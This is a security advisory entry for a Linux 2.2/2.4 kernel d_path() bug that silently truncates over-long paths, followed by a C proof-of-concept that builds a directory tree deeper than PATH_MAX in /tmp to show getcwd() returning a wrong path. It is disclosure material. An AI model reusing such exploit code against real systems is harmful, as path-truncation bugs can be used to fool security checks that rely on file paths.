source: http://www.securityfocus.com/bid/4367/info


The Linux kernel d_path() function converts a dentry structure into an ASCII path name. The full path to the specified dentry is returned in a fixed length buffer of size PAGE_SIZE bytes.

Reportedly, if a dentry structure is passed with a path which would exceed this length, an erroneous value is returned. The path which is returned has leading entries truncated, and no error is reported.

/*
 * 2.2.x/2.4.x Linux kernel d_path proof-of-concept exploit
 *
 * Bug found by cliph
 */

#include <unistd.h>
#include <stdio.h>
#include <limits.h>
#include <errno.h>
#include <paths.h>

/*
 *  Note: on Linux 2.2.x PATH_MAX = PAGE_SIZE - 1 that gives us 1 byte for 
 *        trailing '\0' 
 */

#define PATH_COMPONENT "123456789abcdef"

void err(char * msg)
{
	if (errno) {
		perror(msg);
		exit(1);
	}
}

int main()
{
	char buf[PATH_MAX + 1]; /* think of trailing '\0' */
	int len;
	
	errno = 0;

	chdir(_PATH_TMP);
	err("chdir");
	
	/* show CWD before exploiting the bug */
	getcwd(buf, sizeof(buf));
	err("getcwd #1");
	fprintf(stderr, "CWD=%.40s\n", buf);
	
	/* creating long directory tree - it must exceed PATH_MAX characters */
	for (len = 0; len <= PATH_MAX; len += strlen(PATH_COMPONENT) + 1) {
		errno = 0;
		mkdir(PATH_COMPONENT, 0700);
		if (errno != EEXIST)
			err("mkdir");
		errno = 0;
		chdir(PATH_COMPONENT);
		err("mkdir");
	}

	/* show CWD before exploiting the bug */
	getcwd(buf, sizeof(buf));
	err("getcwd #1");
	fprintf(stderr, "CWD=%.40s... [stripped]\n", buf);
	
	return 0;
}

